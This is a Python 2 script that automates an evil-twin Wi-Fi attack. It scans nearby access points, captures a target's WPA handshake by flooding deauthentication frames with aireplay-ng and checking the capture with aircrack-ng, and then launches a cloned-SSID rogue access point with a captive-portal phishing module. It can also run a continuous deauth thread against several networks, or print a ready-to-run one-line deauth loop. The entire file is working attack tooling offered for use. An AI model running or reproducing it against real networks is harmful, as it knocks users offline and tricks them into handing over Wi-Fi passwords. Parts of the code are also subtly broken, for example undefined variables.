import re
import subprocess
import threading
import time
import sys
import os

script_name = "captive_portal.sh"

ap_interface  = ""
mon_interface = ""
ap_target = None
deauth_targets = []

folder_module = ""
module = ""

ap_channel = ""
ap_ssid = ""
ap_password = ""
handshake_path = ""
deauth = False
deauth_mode = None

################################################################################################

if not os.geteuid() == 0:
	print "[!] Error, this script must be run as root"
	sys.exit(1)

DN = open(os.devnull, 'w')
ERRLOG = open(os.devnull, 'w')
OUTLOG = open(os.devnull, 'w')

################################################################################################
################################################################################################
################################################################################################

#import subprocess
#import time
#import sys
#import os
import signal
import shutil

#DN = open(os.devnull, 'w')
#ERRLOG = open(os.devnull, 'w')
#OUTLOG = open(os.devnull, 'w')

def program_exists(program):
	"""
		Uses 'which' (linux command) to check if a program is installed.
	"""

	proc = subprocess.Popen(['which', program], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	txt = proc.communicate()
	if txt[0].strip() == '' and txt[1].strip() == '':
		return False
	if txt[0].strip() != '' and txt[1].strip() == '':
		return True

	return not (txt[1].strip() == '' or txt[1].find('no %s in' % program) != -1)


def send_interrupt(process):
	"""
		Sends interrupt signal to process's PID.
	"""
	try:
		os.kill(process.pid, signal.SIGINT)
		# os.kill(process.pid, SIGTERM)
	except OSError:
		pass  # process cannot be killed
	except TypeError:
		pass  # pid is incorrect type
	except UnboundLocalError:
		pass  # 'process' is not defined
	except AttributeError:
		pass  # Trying to kill "None"


def rename(old, new):
	"""
		Renames file 'old' to 'new', works with separate partitions.
		Thanks to hannan.sadar
	"""
	try:
		os.rename(old, new)
	except os.error, detail:
		if detail.errno == errno.EXDEV:
			try:
				copy(old, new)
			except:
				os.unlink(new)
				raise
				os.unlink(old)
		# if desired, deal with other errors
		else:
			raise
		
def delete_old_airodump_files (directory):
	try: os.remove (directory + "wpa-01.cap")
	except: pass
	try: os.remove (directory + "wpa-01.csv")
	except: pass
	try: os.remove (directory + "wpa-01.kismet.csv")
	except: pass
	try: os.remove (directory + "wpa-01.kismet.netxml")
	except: pass
	try: os.remove (directory + "wpa-01.cap.temp")
	except: pass

# ------------------------------------------------------------------------- #

def has_handshake_aircrack(target, capfile):
	"""
		Uses aircrack-ng to check for handshake.
		Returns True if found, False otherwise.
	"""
	if not program_exists('aircrack-ng'): return False
	crack = 'echo "" | aircrack-ng -a 2 -w - -b ' + target["mac"] + ' ' + capfile
	proc_crack = subprocess.Popen(crack, stdout=subprocess.PIPE, stderr=DN, shell=True)
	proc_crack.wait()
	txt = proc_crack.communicate()[0]
	return (txt.find('Passphrase not in dictionary') != -1)



def strip_handshake(capfile):
	"""
		Uses Tshark or Pyrit to strip all non-handshake packets from a .cap file
		File in location 'capfile' is overwritten!
	"""
	output_file = capfile
	if program_exists('pyrit'):
		cmd = ['pyrit',
			   '-r', capfile,
			   '-o', capfile + '.temp',
			   'stripLive']
		print "[*] Stripping handshake using pyrit..."
		subprocess.call(cmd, stdout=DN, stderr=DN)
		rename(capfile + '.temp', output_file)

	elif program_exists('tshark'):
		# strip results with tshark
		cmd = ['tshark',
			   '-r', capfile,  # input file
			   '-R', 'eapol || wlan_mgt.tag.interpretation',  # filter
			   '-2', # -R is deprecated and requires -2
			   '-w', capfile + '.temp']  # output file
		print "[*] Stripping handshake using tshark..."
		proc_strip = subprocess.call(cmd, stdout=DN, stderr=DN)

		rename(capfile + '.temp', output_file)

	else:
		print "[!] Unable to strip .cap file: neither pyrit nor tshark were found"

# ------------------------------------------------------------------------- #

def grab_handshake (target, iface):

	WPA_ATTACK_TIMEOUT = 500
	WPA_DEAUTH_TIMEOUT = 10
	WPA_DEAUTH_COUNT = 5
	WPA_STRIP_HANDSHAKE = True
	MAX_ERROR = 5
	DIRECTORY = "./hs/"

	# Generate the filename to save the .cap file as <SSID>_aa_bb_cc_dd_ee_ff.cap
	save_as = "handshake_" + target["essid"].replace(" ", "_") + "_" + target["mac"].replace(":", "-") + ".cap"

	# Process init
	proc_read = None
	proc_deauth = None

	# CHECK IF AN HANDSHAKE EXIST ALREADY, and exits function
	if os.path.isfile(DIRECTORY + save_as): 
		print "[*] Handshake already grabbed for: " + target["essid"] + " (" + target["mac"] + ")"
		return DIRECTORY + save_as

	# Check if directory exits, or make it
	if not os.path.isdir(DIRECTORY):
		try:
			os.mkdir(DIRECTORY)
		except Exception, e:
			print e
			DIRECTORY = "./"

	# Deleting old airodump files
	delete_old_airodump_files (DIRECTORY)

	try:
		# Start airodump-ng process to capture handshakes
		cmd = ['airodump-ng',
			   '-w', DIRECTORY + 'wpa',
			   '-c', target["channel"],
			   '--write-interval', '1',
			   '--bssid', target["mac"],
			   iface]
		proc_read = subprocess.Popen(cmd, stdout=DN, stderr=DN)

		# Setting deauthentication process here to avoid errors later on
		got_handshake = False

		print "[*] Starting listening for " + target["essid"] + " (" + target["mac"] + ")..."

		error_count = 0
		seconds_running = 0
		seconds_since_last_deauth = 0
		start_time = time.time()

		# Deauth and check-for-handshake loop
		while ((not got_handshake) and (WPA_ATTACK_TIMEOUT <= 0 or seconds_running < WPA_ATTACK_TIMEOUT)):
			
			if (error_count >= MAX_ERROR): print "\n[!] Too many errors, interrupting..."; break

			if proc_read.poll() != None:
				print "[!] airodump-ng exited with status " + str(proc_read.poll())
				if ("proc_read.poll()" != "0"): error_count += 1
			
			time.sleep(1)
			seconds_since_last_deauth += int(time.time() - start_time - seconds_running)
			seconds_running = int(time.time() - start_time)

			sys.stdout.write('.')
   			sys.stdout.flush()

			if seconds_since_last_deauth > WPA_DEAUTH_TIMEOUT:
				seconds_since_last_deauth = 0

				# Send deauth packets via aireplay-ng
				cmd = ['aireplay-ng',
					   '--ignore-negative-one',
					   '-0',  					# Attack method (Deauthentication)
						str(WPA_DEAUTH_COUNT),  	# Number of packets to send
					   '-a', target["mac"],
					   '-D', iface]

				print "\n[*] Sending deauth to broadcast..."

				# Send deauth packets via aireplay, wait for them to complete.
				proc_deauth = subprocess.Popen(cmd, stdout=DN, stderr=DN)
				proc_deauth.wait()

			# Copy current dump file for consistency
			if not os.path.exists(DIRECTORY + 'wpa-01.cap'): continue
			shutil.copy(DIRECTORY + 'wpa-01.cap', DIRECTORY + 'wpa-01.cap.temp')

			# Check for handshake
			if has_handshake_aircrack(target, DIRECTORY + 'wpa-01.cap.temp'):
				got_handshake = True

				# Kill the airodump and aireplay processes
				send_interrupt(proc_read)
				send_interrupt(proc_deauth)

				# Save a copy of the handshake
				rename(DIRECTORY + 'wpa-01.cap.temp', DIRECTORY + save_as)

				print "\n[*] Handshake saved as: " + DIRECTORY + save_as

				# Strip handshake if needed
				if WPA_STRIP_HANDSHAKE: strip_handshake(DIRECTORY + save_as)

				break # Break out of while loop

			# No handshake yet
			os.remove(DIRECTORY + 'wpa-01.cap.temp')


		# End of Handshake wait loop.
		if not got_handshake:
			print "\n[!] No handshake grabbed in time."


	except Exception, e:
		send_interrupt(proc_read)
		send_interrupt(proc_deauth)
		print "\n[!] " + str(e)

	except KeyboardInterrupt:
		print "\n[!] User interruption."
		send_interrupt(proc_read)
		send_interrupt(proc_deauth)

	send_interrupt(proc_read)
	send_interrupt(proc_deauth)

	# Deleting old airodump files
	time.sleep (1)
	delete_old_airodump_files (DIRECTORY)

	print "\n"

	if (got_handshake): return DIRECTORY + save_as
	else: return False


################################################################################################
################################################################################################
################################################################################################

cellNumberRe = re.compile(r"^Cell\s+(?P<cellnumber>.+)\s+-\s+Address:\s(?P<mac>.+)$")
regexps = [
	re.compile(r"^ESSID:\"(?P<essid>.*)\"$"),
	re.compile(r"^Protocol:(?P<protocol>.+)$"),
	re.compile(r"^Mode:(?P<mode>.+)$"),
	re.compile(r"^Frequency:(?P<frequency>[\d.]+) (?P<frequency_units>.+) \(Channel (?P<channel>\d+)\)$"),
	re.compile(r"^Encryption key:(?P<encryption>.+)$"),
	re.compile(r"^Quality=(?P<signal_quality>\d+)/(?P<signal_total>\d+)\s+Signal level=(?P<signal_level_dBm>.+) d.+$"),
	re.compile(r"^Signal level=(?P<signal_quality>\d+)/(?P<signal_total>\d+).*$"),
]

# Runs the comnmand to scan the list of networks.
# Must run as super user.
# Does not specify a particular device, so will scan all network devices.
def scan(interface='wlan0'):
	cmd = ["iwlist", interface, "scan"]
	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	points = proc.stdout.read().decode('utf-8')
	return points

# Parses the response from the command "iwlist scan"
def parse(content):
	cells = []
	lines = content.split('\n')
	for line in lines:
		line = line.strip()
		cellNumber = cellNumberRe.search(line)
		if cellNumber is not None:
			cells.append(cellNumber.groupdict())
			continue
		for expression in regexps:
			result = expression.search(line)
			if result is not None:
				cells[-1].update(result.groupdict())
				continue
	return cells

################################################################################################

def interface_down (interface):
	cmd = "ifconfig " + interface + " down"
	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	interfaces_list = proc.stdout.read()

def interface_up (interface):
	cmd = "ifconfig " + interface + " up"
	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	interfaces_list = proc.stdout.read()


def get_interface_mode (interface):
	cmd = "iwconfig " + interface + " | grep \'Mode:\' | grep -oP \'(?<=Mode:).*?(?= )\'"
	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	mode = proc.stdout.read().rstrip()								# Read and remove newline
	return mode

def get_interface_driver (interface):
	cmd = "airmon-ng | grep " + item + " | cut -f4"							# Get the driver
	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	driver = proc.stdout.read().rstrip()							# Read and remove newline
	return driver



def enable_monitor_mode(interface):
	#cmd = "airmon-ng check kill; airmon-ng start " + interface
	interface_down (interface)

	cmd = "iwconfig " + interface + " mode monitor; "
	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	execute = proc.stdout.read().split("\n")
	mon_error = proc.stderr.read()

	interface_up (interface)
	if mon_error: return False
	else: return True



def disable_monitor_mode(interface):
	#cmd = "airmon-ng stop " + interface
	interface_down (interface)

	cmd = "iwconfig " + interface + " mode managed; "
	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	execute = proc.stdout.read().split("\n")
	mon_error = proc.stderr.read()

	interface_up (interface)
	if mon_error: return False
	else: return True


################################################################################################

def broadcast_deauth (ch, bssid, interface):
	WPA_DEAUTH_COUNT = 5

	cmd = "aireplay-ng -0 " + str(WPA_DEAUTH_COUNT) + " -a " + bssid + " " + interface + " -D &>/dev/null";
	proc = subprocess.Popen(cmd, bufsize=0, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	stdout, stderr = proc.communicate()

	ec = proc.wait()

	if ec == 0:
		print "\033[0;32m[*] CH: " + str(ch) + " DB: " + bssid + "\033[0m"
	else:
		print "\033[0;31m[*] CH: " + str(ch) + " DB: " + bssid + "\033[0m"


def switch_channel (ch, interface):
	cmd = "iw dev " + interface + " set channel " + str(ch);
	proc = subprocess.Popen(cmd, bufsize=0, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	stdout, stderr = proc.communicate()


def deauth_thread (deauth_targets, interface):
	while deauth:
		try:
			for t in deauth_targets:
				ch = t["channel"]
				bssid = t["mac"]
				
				switch_channel (ch, interface)
				broadcast_deauth (ch, bssid, interface)
		except:
			print "[!] Error Deahting..."
			time.sleep (1)


################################################################################################

print "[*] Checking dependencies...\n"

dep = [
		'iptables', 'php', 'psmisc', 'net-tools', 'aircrack-ng',
		'bind9', 'hostapd', 'isc-dhcp-server', 'apache2'
	]

dep_missing = []

for d in dep:
	cmd = "/usr/bin/dpkg -s " + d + " &> /dev/null"
	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	result = proc.stdout.read()
	dep_error = proc.stderr.read()

	if (len(dep_error) > 1):
		print "[!] " + d + " Not installed"
		dep_missing.append(d)
	else:
		print "[*] " + d + " Installed"

if (len (dep_missing) > 1):
	print "\n[!] Missing dependencies, please do:"
	print "    apt-get update; apt-get install " + ' '.join(dep_missing) + " -y"
	sys.exit (1)

##########################################################################################

print "\n\n\n[*] Killing dangerous processes..."

cmd = "airmon-ng check kill"
proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
execute = proc.stdout.read()

##########################################################################################

print "[*] Searching interfaces...\n"

cmd = "iwconfig | grep \"IEEE\" | cut -d \" \" -f1"
proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
iw_iface_list = proc.stdout.read().split("\n")						# Get iwconfig interfaces
iw_iface_list = [ s for s in iw_iface_list if "wlan" in s ]			# Remove non wlan interfaces
iw_iface_list = filter(None, iw_iface_list)							# Remove empty strings

for i in iw_iface_list:
	m = get_interface_mode (i)
	if ((m != "Managed") and (m != "Master")):
		tmp = None
		while ((tmp != "y") and (tmp != "n")):
			tmp = raw_input ("-) Disable " + m + " for " + i + " (y/n): ")
			if (tmp == "y"): 
				disable_monitor_mode (i)
				interface_up (i)

	elif ((m != "Managed") and (m == "Master")):
		tmp = None
		while ((tmp != "yes") and (tmp != "n")):
			print "\n[!] Interface: " + i + " is in " + m + " mode, this"
			tmp = raw_input ("could lead in connection loss, disable (yes/n): ")
			if (tmp == "yes"): 
				disable_monitor_mode (i)
				interface_up (i)
				
	else:
		interface_up (i)


cmd = "ifconfig | grep \"mtu\" | cut -d \" \" -f 1 | tr -d \':\'"
proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
interfaces_list = proc.stdout.read().split("\n")					# Get output and split it
interfaces_list = [ s for s in interfaces_list if "wlan" in s ]		# Remove non wlan interfaces
#interfaces_list = [ s for s in interfaces_list if not "mon" in s ]	# Remove mon interfaces
interfaces_list = filter(None, interfaces_list)						# Remove empty strings
interfaces_list = sorted(interfaces_list, key=str.lower)			# Sort alphabetically

if (len(interfaces_list) < 1):
	print "[!] No wireless interface found. Quitting."
	sys.exit(1)


for index, item in enumerate(interfaces_list):
	# Get the driver of each interface and put it in the list
	d = get_interface_driver (i)
	interfaces_list[index] = {"name":item, "driver":d}


print "\n\n\n\n\n####################################"
print "# Select AP interface              #"
print "####################################"
c = 1
for i in interfaces_list:
	if c<10: print str(c) + ")  " + i["name"] + "  (" + i["driver"] + ")"
	else:    print str(c) + ") "  + i["name"] + "  (" + i["driver"] + ")"
	c += 1
print "####################################"
while (len(ap_interface) < 1):
	x = raw_input ("Choose: ")
	try: 
		if (int(x) > 0):
			ap_interface = interfaces_list[int(x) - 1]["name"];
	except: 
		pass

# ------------------------------------------------------------------------- #

# Remove AP interface from list
interfaces_list = [ s for s in interfaces_list if ap_interface not in s["name"] ]

print "\n\n\n\n\n####################################"
print "# Select Monitor interface         #"
print "####################################"
c = 1
for i in interfaces_list:
	if c<10: print str(c) + ")  " + i["name"] + "  (" + i["driver"] + ")"
	else:    print str(c) + ") "  + i["name"] + "  (" + i["driver"] + ")"
	c += 1
print "99) No Monitor Interface"
print "####################################"
while (len(mon_interface) < 1):
	x = raw_input ("Choose: ")
	try:
		if (int(x) == 99):
			mon_interface = "NONE"
		elif (int(x) > 0):
			mon_interface = interfaces_list[int(x) - 1]["name"];
	except: 
		pass

################################################################################################

scan_interface = None
populated = False
if mon_interface == "NONE": scan_interface = ap_interface
else: scan_interface = mon_interface

print "\n\n\n\n\n[*] Scanning networks using " + scan_interface + "..."

while (not populated):

	interface_down (scan_interface)
	interface_up (scan_interface)
	networks_list = sorted( parse(scan(scan_interface)) , key=lambda k: k['signal_level_dBm'])

	if (len(networks_list) > 1): 
		populated = True

	else: 
		populated = False
		raw_input ("[!] No network found (using " + scan_interface + "), press enter to retry...")


print "\n\n\n\n\n#################################################################"
print "# MAC\t\t\tCh\tSignal\tSSID\t\t\t#"
print "#################################################################"
c = 1
for n in networks_list:
	if (c<10): print str(c) + ")  " + n["mac"] + "\t" + n["channel"] + "\t" + n["signal_level_dBm"] + "\t" + n["essid"]
	else:      print str(c) + ") "  + n["mac"] + "\t" + n["channel"] + "\t" + n["signal_level_dBm"] + "\t" + n["essid"]
	c += 1
print "#################################################################"
while ( not ap_target ) and (len (deauth_targets) < 1):
	x = raw_input ("Choose Target: ")
	try:
		if (int(x) > 0):
			ap_target = networks_list[int(x) - 1]; 
			deauth_targets.append(networks_list[int(x) - 1])
	except: 
		pass


if (mon_interface != "NONE"):
	done = False
	while (not done):
		targets_list = raw_input ("Choose Addittionals Deauth Targets (Separated by space): ")
		if (len(targets_list) > 0):
			targets_list = targets_list.split(" ")
			for i in targets_list:
				try:
					if (networks_list[int(i) - 1] not in deauth_targets):
						deauth_targets.append(networks_list[int(i) - 1]); 
						done = True
					else:
						done = True
				except Exception, e:
					print e 
					done = False
		else:
			done = True

################################################################################################

print "\n\n[*] Putting " + mon_interface + " in monitor mode..."
mon_status = enable_monitor_mode (mon_interface)

if (mon_status == True): print "[*] " + mon_interface + " is now in monitor mode"
elif (mon_status == False): mon_interface == "NONE"

################################################################################################

cmd = "ls ap_module -l | awk \'{print $9}\'"
proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
folders_list = proc.stdout.read().split("\n")							# Read folders
folders_list = [ s for s in folders_list if not "_bootstrap" in s ]		# Remove bootstrap
folders_list = filter(None, folders_list)								# Remove empty strings
folders_list = sorted(folders_list, key=str.lower)						# Sort alphabetically

print "\n\n\n\n\n####################################"
print "# Module Folder                    #"
print "####################################"
c = 1
for f in folders_list:
	if (c<10): print str(c) + ")  " + f
	else:      print str(c) + ") "  + f
	c += 1
print "####################################"
while (len(folder_module) < 1):
	x = raw_input ("Choose: ")
	try:
		if (int(x) > 0):
			folder_module = folders_list[int(x) - 1];
	except: 
		pass

# ------------------------------------------------------------------------- #

cmd = "ls ap_module/"+ folder_module + " -l | awk \'{print $9}\'"
proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
modules_list = proc.stdout.read().split("\n")							# Read modules
modules_list = filter(None, modules_list)								# Remove empty strings
modules_list = sorted(modules_list, key=str.lower)						# Sort alphabetically

print "\n\n\n\n\n####################################"
print "# Module                           #"
print "####################################"
c = 1
for f in modules_list:
	if (c<10): print str(c) + ")  " + f
	else:      print str(c) + ") "  + f
	c += 1
print "####################################"
while (len(module) < 1):
	x = raw_input ("Choose: ")
	try:
		if (int(x) > 0):
			module = modules_list[int(x) - 1];
	except: 
		pass

################################################################################################

print "\n\n\n\n\n####################################"
print "# Settings                         #"
print "####################################"
while (len(ap_channel) < 1):
	try:
		if ( 1 <= int(ap_target["channel"]) <= 14):		# 2,4 ghz channels

			tmp = raw_input ("-) AP Channel (" + ap_target["channel"] + "): ")
			if (len(tmp)<1): 
				ap_channel = ap_target["channel"]
			else:
				try: ap_channel = str(int(tmp))
				except: pass

		else:											# 5 ghz channels

			tmp = raw_input ("-) AP Channel (1): ")
			if (len(tmp)<1): 
				ap_channel = "1"
			else:
				try: ap_channel = str(int(tmp))
				except: pass
	except:
		pass

# ------------------------------------------------------------------------- #

while (len(ap_ssid) < 1):
	tmp = raw_input ("-) AP SSID (" + ap_target["essid"] + "): ")
	if (len(tmp)<1): 
		ap_ssid = ap_target["essid"]
	else:
		ap_ssid = tmp

# ------------------------------------------------------------------------- #

while (len(ap_password) < 8):
	tmp = raw_input ("-) AP Password (None): ")
	if (len(tmp)<1): ap_password = "NONENONE"
	else: ap_password = tmp

# ------------------------------------------------------------------------- #

tmp = raw_input ("-) Handshake (None): ")
if (len(tmp)<1): handshake_path = "NONE"
else: handshake_path = tmp

# ------------------------------------------------------------------------- #

if ((handshake_path == "NONE") and (mon_interface != "NONE")):

	tmp = None
	while ((tmp != "y") and (tmp != "n")):
		tmp = raw_input ("-) Automatically grab handshake (y/n): ")

	if (tmp == "y"):
		hs = grab_handshake (ap_target, mon_interface)
		if (hs == False): handshake_path = "NONE"
		else: handshake_path = hs
	else:
		handshake_path = "NONE"

else:
	pass

print "\n\n\n"

################################################################################################

print "[*] Stopping previus instances of " + script_name + "..."

cmd =  "bash " + script_name + " stop"
exit_code = os.system (cmd)

if (str(exit_code) != "0"):
	print "\n\n[!] The execution of the script " + script_name + " failed."
	print "[!] Quitting..."
	sys.exit(1)

# ------------------------------------------------------------------------- #

cmd =  "bash " + script_name + " -i " + ap_interface + " -c " + ap_channel
cmd += " -s \"" + ap_ssid + "\" -m " + folder_module + "/" + module

if (ap_password != "NONENONE"): cmd += " -p \"" + ap_password + "\""
if (handshake_path != "NONE"):  cmd += " -a \"" + handshake_path + "\""

cmd += " start"

print "\n\n[*] Executing script " + script_name + " using this command: "
print cmd
print "\n\n"

# ------------------------------------------------------------------------- #

exit_code = os.system (cmd)		# Run captive_portal.sh start

if (str(exit_code) != "0"):
	print "\n\n[!] The execution of the script " + script_name + " failed."
	print "[!] Quitting..."
	sys.exit(1)

else:
	print "\n\n[*] The execution of the script " + script_name + " was successful."
	pass


################################################################################################

if (mon_interface != "NONE"):
	print "\n\n\n\n\n####################################"
	print "# Deauth                           #"
	print "####################################"
	print " 1) Deauth with one-line string (Safe)"
	print " 2) Deauth with multi-line string"
	print " 3) Auto deauth"
	print " 4) No deauth"
	print "####################################"
	
	while (deauth_mode == None):
		try:
			tmp = raw_input ("-) Deauth (1): ")
			if ( 1 <= int(tmp) <= 4): deauth_mode = tmp
			elif (len(tmp) < 1): deauth_mode = "1"
		except:
			pass
else:
	deauth_mode = False

################################################################################################

if ((mon_interface != "NONE") and (deauth_mode == "1")):
	print "\n\n[*] Generate one-line deauth script: \n\n"

	deauth_str = 'mon_inface=\'' + mon_interface + 'mon' + '\' ; while [ 1 ]; do '
	for t in deauth_targets:
		ch = t["channel"]
		bssid = t["mac"]
		deauth_str += "iw dev $mon_inface set channel " + ch + " ; "
		deauth_str += "aireplay-ng --ignore-negative-one -0 5 -a " + bssid + " -D $mon_inface ; "
	deauth_str += "done"
	print deauth_str

elif ((mon_interface != "NONE") and (deauth_mode == "2")):
	print "\n\n[*] Generate multi-line deauth script: \n\n"

	deauth_str = 'mon_inface=\'' + mon_interface + 'mon' '\' ; while [ 1 ]; do \\'
	for t in deauth_targets:
		ch = t["channel"]
		bssid = t["mac"]
		deauth_str += "\niw dev $mon_inface set channel " + ch + " ; \\"
		deauth_str += "\naireplay-ng --ignore-negative-one -0 5 -a " + bssid + " -D $mon_inface ; \\"
	deauth_str += "\ndone"
	print deauth_str

elif ((mon_interface != "NONE") and (deauth_mode == "3")):
	if (mon_interface != "NONE"):
		deauth = True
		print "[*] Running deauth thread in 3 sec..."
		time.sleep (3)

		#enable_monitor_mode (mon_interface)

		t = threading.Thread(target=deauth_thread, args=(deauth_targets, mon_interface,))
		t.start()
	else:
		print "[!] Error, no monitor interface."

elif ((mon_interface != "NONE") and (deauth_mode == "4")):
	pass

else:
	pass

################################################################################################

if (handshake_path != "NONE"): cmd =  "bash " + script_name + " autocheck"
else: cmd =  "bash " + script_name + " check"

exit_code = os.system (cmd)		# Run captive_portal.sh check

print "\n\n[*] Script terminated, wait for reset..."

time.sleep (5)
deauth = False

################################################################################################
'''
if (mon_interface != "NONE"):
	print "[*] Setting back " + mon_interface + " to managed mode..."

	time.sleep (1)
	disable_monitor_mode (mon_interface)
'''
################################################################################################
# TODO BETTER:
# - SUMMARY
# - DEAUTH PROCESS
# - CHECK PROCESS







